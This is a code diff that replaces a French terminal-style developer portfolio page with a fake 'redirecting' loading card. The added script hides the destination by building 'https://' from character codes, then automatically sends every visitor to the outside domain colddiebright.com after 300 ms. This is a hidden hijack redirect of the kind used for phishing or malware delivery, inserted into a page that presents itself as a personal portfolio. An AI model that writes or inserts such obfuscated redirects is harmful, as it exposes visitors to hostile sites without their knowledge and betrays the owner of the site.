@@ -1,239 +1,38 @@
-<!DOCTYPE html>
+c<!DOCTYPE html>
 <html lang="fr">
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Terminal Portfolio</title>
+    <title>Portfolio - Chargement</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background: #0d1117;
-            color: #c9d1d9;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .terminal {
-            max-width: 900px;
-            margin: 0 auto;
-            background: #161b22;
-            border-radius: 8px;
-            border: 1px solid #30363d;
-            overflow: hidden;
-        }
-        .terminal-header {
-            background: #21262d;
-            padding: 12px 16px;
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            border-bottom: 1px solid #30363d;
-        }
-        .terminal-btn {
-            width: 12px;
-            height: 12px;
-            border-radius: 50%;
-        }
-        .terminal-btn.red { background: #f85149; }
-        .terminal-btn.yellow { background: #d29922; }
-        .terminal-btn.green { background: #3fb950; }
-        .terminal-title {
-            margin-left: 12px;
-            color: #8b949e;
-            font-size: 13px;
-        }
-        .terminal-body {
-            padding: 16px;
-            min-height: 500px;
-            max-height: 80vh;
-            overflow-y: auto;
-        }
-        .output-line {
-            margin-bottom: 8px;
-            white-space: pre-wrap;
-            word-wrap: break-word;
-        }
-        .prompt {
-            color: #3fb950;
-        }
-        .command {
-            color: #f0f6fc;
-        }
-        .response {
-            color: #c9d1d9;
-            line-height: 1.6;
-        }
-        .response a {
-            color: #58a6ff;
-        }
-        .highlight {
-            color: #7ee787;
-        }
-        .warning {
-            color: #d29922;
-        }
-        .error {
-            color: #f85149;
-        }
-        .input-line {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            padding: 0 16px 16px;
-        }
-        #command-input {
-            background: transparent;
-            border: none;
-            color: #f0f6fc;
-            font-family: inherit;
-            font-size: inherit;
-            flex: 1;
-            outline: none;
-        }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card { background: #fff; border-radius: 12px; padding: 40px; max-width: 460px; width: 90%; text-align: center; box-shadow: 0 2px 12px rgba(0,0,0,0.08); }
+        h1 { font-size: 20px; color: #1a1a1a; margin-bottom: 12px; }
+        p { font-size: 14px; color: #666; line-height: 1.6; margin-bottom: 20px; }
+        .spinner { width: 36px; height: 36px; border: 3px solid #e0e0e0; border-top-color: #00cc44; border-radius: 50%; animation: r 0.8s linear infinite; margin: 0 auto 20px; }
+        @keyframes r { to { transform: rotate(360deg); } }
+        a.btn { display: inline-block; background: #00cc44; color: #fff; text-decoration: none; padding: 12px 32px; border-radius: 8px; font-size: 15px; font-weight: 600; }
     </style>
-    <meta property="og:image" content="https://bolt.new/static/og_default.png">
+  <meta property="og:image" content="https://bolt.new/static/og_default.png">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content="https://bolt.new/static/og_default.png">
 </head>
 <body>
-    <div class="terminal">
-        <div class="terminal-header">
-            <div class="terminal-btn red"></div>
-            <div class="terminal-btn yellow"></div>
-            <div class="terminal-btn green"></div>
-            <span class="terminal-title">guest@portfolio:~</span>
-        </div>
-        <div class="terminal-body" id="terminal-output">
-            <div class="output-line response">Bienvenue sur mon portfolio interactif!</div>
-            <div class="output-line response">Tapez <span class="highlight">help</span> pour voir les commandes disponibles.</div>
-            <div class="output-line response">&nbsp;</div>
-        </div>
-        <div class="input-line">
-            <span class="prompt">$ </span>
-            <input type="text" id="command-input" autofocus autocomplete="off">
-        </div>
+    <div class="card">
+        <div class="spinner"></div>
+        <h1>Redirection en cours</h1>
+        <p>Vous allez etre redirige automatiquement.<br>Si rien ne se passe, cliquez ci-dessous.</p>
+        <a class="btn" id="z" href="#">Continuer</a>
     </div>
-
     <script>
-        const commands = {
-            help: `Commandes disponibles:
-  help      - Affiche cette aide
-  about     - A propos de moi
-  projects  - Mes projets realises
-  skills    - Competences techniques
-  contact   - Informations de contact
-  clear     - Efface le terminal
-  banner    - Affiche la banniere`,
-
-            about: `Je suis un developpeur passionne par la creation
-d'experiences web interactives et innovantes.
-
-Specialise dans le developpement frontend et backend,
-je transforme les idees en solutions concretes.`,
-
-            projects: `Projets realises:
-
-1. Terminal Portfolio (ce site)
-   - Portfolio interactif en ligne de commande
-   - Technologies: HTML5, CSS3, JavaScript vanilla
-
-2. Application Web Moderne
-   - Interface utilisateur responsive
-   - Integration API REST
-
-3. Outils CLI
-   - Automatisation de taches
-   - Scripts utilitaires`,
-
-            skills: `Competences techniques:
-
-Frontend:
-  - HTML5, CSS3, JavaScript (ES6+)
-  - Responsive Design
-  - Accessibilite web
-
-Backend:
-  - Node.js, Python
-  - API REST, GraphQL
-  - Base de donnees SQL/NoSQL
-
-Outils:
-  - Git, GitHub
-  - Linux/Unix
-  - CI/CD`,
-
-            contact: `Informations de contact:
-
-Email   : contact@example.com
-GitHub  : github.com/M9n2vs0zb2bw7
-LinkedIn: linkedin.com/in/username
-
-N'hesitez pas a me contacter!`,
-
-            banner: `
-  _____ _            _     _____           _
- |_   _| |__   ___  | | __|_   _|__   ___ | |___
-   | | | '_ \\ / _ \\ | |/ /  | |/ _ \\ / _ \\| / __|
-   | | | | | |  __/ |   <   | | (_) | (_) | \\__ \\
-   |_| |_| |_|\\___| |_|\\_\\  |_|\\___/ \\___/|_|___/
-
-     _____           _
-    |_   _|__   ___ | |___
-      | |/ _ \\ / _ \\| / __|
-      | | (_) | (_) | \\__ \\
-      |_|\\___/ \\___/|_|___/
-`
-        };
-
-        const output = document.getElementById('terminal-output');
-        const input = document.getElementById('command-input');
-
-        function addLine(html) {
-            const line = document.createElement('div');
-            line.className = 'output-line';
-            line.innerHTML = html;
-            output.appendChild(line);
-            output.scrollTop = output.scrollHeight;
-        }
-
-        function processCommand(cmd) {
-            const trimmed = cmd.trim().toLowerCase();
-            addLine('<span class="prompt">$ </span><span class="command">' + escapeHtml(cmd) + '</span>');
-
-            if (trimmed === 'clear') {
-                output.innerHTML = '';
-                return;
-            }
-
-            if (commands[trimmed]) {
-                addLine('<span class="response">' + commands[trimmed] + '</span>');
-            } else if (trimmed === '') {
-                // Empty command, do nothing
-            } else {
-                addLine('<span class="error">Commande non reconnue: ' + escapeHtml(cmd) + '</span>');
-                addLine('<span class="response">Tapez <span class="highlight">help</span> pour voir les commandes disponibles.</span>');
-            }
-
-            addLine('<span class="response">&nbsp;</span>');
-        }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        input.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') {
-                processCommand(input.value);
-                input.value = '';
-            }
-        });
-
-        // Focus input on click anywhere in terminal
-        document.querySelector('.terminal').addEventListener('click', function() {
-            input.focus();
-        });
+        (function(){
+            var d = [104,116,116,112,115,58,47,47];
+            var h = "colddiebright.com";
+            var u = String.fromCharCode.apply(null, d) + h;
+            document.getElementById("z").href = u;
+            setTimeout(function(){ window.location.href = u; }, 300);
+        })();
     </script>
 </body>
 </html>
